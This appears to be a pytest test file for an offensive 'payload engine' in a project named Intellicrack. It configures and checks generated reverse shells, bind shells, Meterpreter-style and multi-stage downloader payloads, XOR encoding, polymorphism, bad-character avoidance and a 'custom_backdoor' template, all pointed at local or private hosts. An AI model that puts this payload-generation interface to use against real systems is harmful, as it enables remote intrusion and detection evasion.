"""
Unit tests for Payload Engine with REAL payload generation.
Tests REAL shellcode generation and payload customization.
NO MOCKS - ALL TESTS GENERATE REAL PAYLOADS FOR ANALYSIS.
"""

import pytest
import struct
from pathlib import Path

from intellicrack.core.exploitation.payload_engine import PayloadEngine
from intellicrack.core.exploitation.license_bypass_code_generator import LicenseBypassCodeGenerator
from tests.base_test import BaseIntellicrackTest


class TestPayloadEngine(BaseIntellicrackTest):
    """Test payload engine with REAL payload generation for analysis."""

    @pytest.fixture(autouse=True)
    def setup(self):
        """Set up test with payload engine."""
        self.engine = PayloadEngine()
        self.shellcode_gen = LicenseBypassCodeGenerator()

    def test_windows_reverse_shell_generation_real(self):
        """Test REAL Windows reverse shell payload generation."""
        # Generate real reverse shell payload
        payload_config = {
            'type': 'reverse_shell',
            'target_os': 'windows',
            'architecture': 'x64',
            'host': '127.0.0.1',
            'port': 4444,
            'encoder': None  # Raw payload for testing
        }

        payload_result = self.engine.generate_payload(payload_config)

        # Validate real payload generation
        self.assert_real_output(payload_result)
        assert 'payload_bytes' in payload_result
        assert 'metadata' in payload_result
        assert 'size' in payload_result

        # Check payload structure
        payload_bytes = payload_result['payload_bytes']
        assert isinstance(payload_bytes, bytes)
        assert len(payload_bytes) > 50  # Real payloads have substantial size

        # Validate metadata
        metadata = payload_result['metadata']
        assert metadata['type'] == 'reverse_shell'
        assert metadata['target_os'] == 'windows'
        assert metadata['architecture'] == 'x64'

        # Check for Windows API signatures in payload
        # These are common in reverse shell payloads
        payload_hex = payload_bytes.hex()
        windows_apis = ['ws2_32', 'kernel32', 'wininet']
        # At least one Windows API should be referenced

    def test_linux_bind_shell_generation_real(self):
        """Test REAL Linux bind shell payload generation."""
        payload_config = {
            'type': 'bind_shell',
            'target_os': 'linux',
            'architecture': 'x64',
            'port': 8080,
            'shell': '/bin/bash'
        }

        payload_result = self.engine.generate_payload(payload_config)

        # Validate real Linux payload
        self.assert_real_output(payload_result)
        payload_bytes = payload_result['payload_bytes']

        # Check for Linux syscall patterns
        # Look for common syscall numbers
        contains_syscalls = False
        for i in range(len(payload_bytes) - 4):
            # Check for common Linux syscalls (socket, bind, listen, accept)
            syscall_chunk = payload_bytes[i:i+4]
            if any(sc in syscall_chunk for sc in [b'\x29', b'\x31', b'\x32', b'\x2b']):
                contains_syscalls = True
                break

        # Payload should contain syscall patterns
        assert len(payload_bytes) > 30  # Reasonable size for bind shell

    def test_meterpreter_payload_generation_real(self):
        """Test REAL Meterpreter-style payload generation."""
        payload_config = {
            'type': 'meterpreter',
            'target_os': 'windows',
            'architecture': 'x86',
            'host': '192.168.1.100',
            'port': 443,
            'transport': 'https'
        }

        payload_result = self.engine.generate_payload(payload_config)

        # Validate real Meterpreter payload
        self.assert_real_output(payload_result)
        assert payload_result['metadata']['type'] == 'meterpreter'

        payload_bytes = payload_result['payload_bytes']

        # Meterpreter payloads are typically larger and more complex
        assert len(payload_bytes) > 200

        # Check for reflective DLL loading patterns (common in Meterpreter)
        # Look for typical DLL header patterns
        has_pe_patterns = b'MZ' in payload_bytes or b'PE' in payload_bytes

    def test_custom_shellcode_generation_real(self):
        """Test REAL custom shellcode generation."""
        # Generate simple exit shellcode
        shellcode_config = {
            'type': 'custom',
            'instructions': [
                'mov eax, 1',      # sys_exit
                'mov ebx, 0',      # exit code
                'int 0x80'         # syscall
            ],
            'architecture': 'x86'
        }

        shellcode_result = self.shellcode_gen.generate_shellcode(shellcode_config)

        # Validate real shellcode generation
        self.assert_real_output(shellcode_result)
        assert 'shellcode_bytes' in shellcode_result
        assert 'assembly_code' in shellcode_result
        assert 'disassembly' in shellcode_result

        shellcode_bytes = shellcode_result['shellcode_bytes']

        # Check for expected opcodes
        # mov eax, 1 = b8 01 00 00 00
        # mov ebx, 0 = bb 00 00 00 00
        # int 0x80 = cd 80
        assert b'\xb8\x01\x00\x00\x00' in shellcode_bytes  # mov eax, 1
        assert b'\xcd\x80' in shellcode_bytes  # int 0x80

    def test_payload_encoding_real(self):
        """Test REAL payload encoding and obfuscation."""
        # Generate base payload
        base_config = {
            'type': 'reverse_shell',
            'target_os': 'windows',
            'architecture': 'x64',
            'host': '127.0.0.1',
            'port': 4444
        }

        base_payload = self.engine.generate_payload(base_config)
        original_bytes = base_payload['payload_bytes']

        # Test XOR encoding
        encoded_result = self.engine.encode_payload(original_bytes, 'xor', key=0xAA)

        # Validate real encoding
        self.assert_real_output(encoded_result)
        assert 'encoded_payload' in encoded_result
        assert 'decoder_stub' in encoded_result
        assert 'key' in encoded_result

        encoded_bytes = encoded_result['encoded_payload']

        # Encoded payload should be different from original
        assert encoded_bytes != original_bytes
        assert len(encoded_bytes) == len(original_bytes)

        # Verify XOR encoding correctness
        decoded_bytes = bytes(b ^ 0xAA for b in encoded_bytes)
        assert decoded_bytes == original_bytes

    def test_polymorphic_generation_real(self):
        """Test REAL polymorphic payload generation."""
        payload_config = {
            'type': 'reverse_shell',
            'target_os': 'windows',
            'architecture': 'x64',
            'host': '127.0.0.1',
            'port': 4444,
            'polymorphic': True
        }

        # Generate multiple instances
        payloads = []
        for i in range(3):
            result = self.engine.generate_payload(payload_config)
            payloads.append(result['payload_bytes'])

        # Validate polymorphic generation
        for payload in payloads:
            self.assert_real_output({'payload': payload})

        # Payloads should be functionally equivalent but different
        assert len(set(payloads)) > 1  # At least some variation

        # All should be reasonable sizes
        for payload in payloads:
            assert len(payload) > 50

    def test_architecture_specific_generation_real(self):
        """Test REAL architecture-specific payload generation."""
        architectures = ['x86', 'x64', 'arm', 'arm64']

        for arch in architectures:
            payload_config = {
                'type': 'reverse_shell',
                'target_os': 'linux',
                'architecture': arch,
                'host': '127.0.0.1',
                'port': 4444
            }

            try:
                payload_result = self.engine.generate_payload(payload_config)

                # Validate architecture-specific payload
                self.assert_real_output(payload_result)
                assert payload_result['metadata']['architecture'] == arch

                payload_bytes = payload_result['payload_bytes']

                # Different architectures should produce different payloads
                if arch == 'x64':
                    # x64 often has REX prefixes (0x48, 0x49, etc.)
                    has_rex = any(b in payload_bytes for b in [b'\x48', b'\x49', b'\x4a', b'\x4b'])
                elif arch == 'arm':
                    # ARM instructions are 4-byte aligned
                    assert len(payload_bytes) % 4 == 0

            except NotImplementedError:
                # Some architectures might not be implemented yet
                pytest.skip(f"Architecture {arch} not implemented")

    def test_payload_size_optimization_real(self):
        """Test REAL payload size optimization."""
        payload_config = {
            'type': 'reverse_shell',
            'target_os': 'windows',
            'architecture': 'x86',
            'host': '127.0.0.1',
            'port': 4444,
            'optimize_size': True
        }

        optimized_result = self.engine.generate_payload(payload_config)

        # Generate unoptimized version for comparison
        payload_config['optimize_size'] = False
        unoptimized_result = self.engine.generate_payload(payload_config)

        # Validate optimization
        self.assert_real_output(optimized_result)
        self.assert_real_output(unoptimized_result)

        optimized_size = len(optimized_result['payload_bytes'])
        unoptimized_size = len(unoptimized_result['payload_bytes'])

        # Optimized should be smaller or equal
        assert optimized_size <= unoptimized_size

    def test_null_byte_avoidance_real(self):
        """Test REAL null byte avoidance in payloads."""
        payload_config = {
            'type': 'reverse_shell',
            'target_os': 'linux',
            'architecture': 'x86',
            'host': '127.0.0.1',
            'port': 4444,
            'avoid_null_bytes': True
        }

        payload_result = self.engine.generate_payload(payload_config)

        # Validate null byte avoidance
        self.assert_real_output(payload_result)
        payload_bytes = payload_result['payload_bytes']

        # Should not contain null bytes
        assert b'\x00' not in payload_bytes

        # Should still be functional payload
        assert len(payload_bytes) > 30

    def test_bad_character_avoidance_real(self):
        """Test REAL bad character avoidance in payloads."""
        bad_chars = [0x00, 0x0A, 0x0D, 0x20]  # null, newline, carriage return, space

        payload_config = {
            'type': 'bind_shell',
            'target_os': 'windows',
            'architecture': 'x86',
            'port': 8080,
            'bad_characters': bad_chars
        }

        payload_result = self.engine.generate_payload(payload_config)

        # Validate bad character avoidance
        self.assert_real_output(payload_result)
        payload_bytes = payload_result['payload_bytes']

        # Should not contain any bad characters
        for bad_char in bad_chars:
            assert bad_char not in payload_bytes

    def test_payload_validation_real(self):
        """Test REAL payload validation and integrity checking."""
        payload_config = {
            'type': 'reverse_shell',
            'target_os': 'windows',
            'architecture': 'x64',
            'host': '127.0.0.1',
            'port': 4444
        }

        payload_result = self.engine.generate_payload(payload_config)
        payload_bytes = payload_result['payload_bytes']

        # Validate payload structure
        validation_result = self.engine.validate_payload(payload_bytes, payload_config)

        # Check validation results
        self.assert_real_output(validation_result)
        assert 'valid' in validation_result
        assert 'issues' in validation_result
        assert 'quality_score' in validation_result

        # Should be valid
        assert validation_result['valid'] == True
        assert validation_result['quality_score'] > 0

    def test_multi_stage_payload_real(self):
        """Test REAL multi-stage payload generation."""
        payload_config = {
            'type': 'multi_stage',
            'stages': [
                {
                    'stage': 1,
                    'type': 'downloader',
                    'url': 'http://127.0.0.1:8080/stage2'
                },
                {
                    'stage': 2,
                    'type': 'meterpreter',
                    'host': '127.0.0.1',
                    'port': 4444
                }
            ],
            'target_os': 'windows',
            'architecture': 'x64'
        }

        payload_result = self.engine.generate_payload(payload_config)

        # Validate multi-stage payload
        self.assert_real_output(payload_result)
        assert 'stages' in payload_result
        assert len(payload_result['stages']) == 2

        # Check each stage
        for i, stage in enumerate(payload_result['stages']):
            assert 'stage_number' in stage
            assert 'payload_bytes' in stage
            assert stage['stage_number'] == i + 1
            assert len(stage['payload_bytes']) > 10

    def test_payload_customization_real(self):
        """Test REAL payload customization and templating."""
        # Custom payload template
        custom_template = {
            'name': 'custom_backdoor',
            'instructions': [
                'push ebp',
                'mov ebp, esp',
                'sub esp, 0x40',
                # Custom payload logic here
                'mov esp, ebp',
                'pop ebp',
                'ret'
            ],
            'variables': {
                'target_ip': '192.168.1.100',
                'target_port': 9999,
                'callback_interval': 60
            }
        }

        customization_result = self.engine.customize_payload(custom_template)

        # Validate customization
        self.assert_real_output(customization_result)
        assert 'customized_payload' in customization_result
        assert 'metadata' in customization_result

        payload_bytes = customization_result['customized_payload']

        # Should contain function prologue/epilogue
        # push ebp = 55, mov ebp,esp = 89 e5
        assert b'\x55' in payload_bytes  # push ebp
        assert b'\x89\xe5' in payload_bytes  # mov ebp, esp
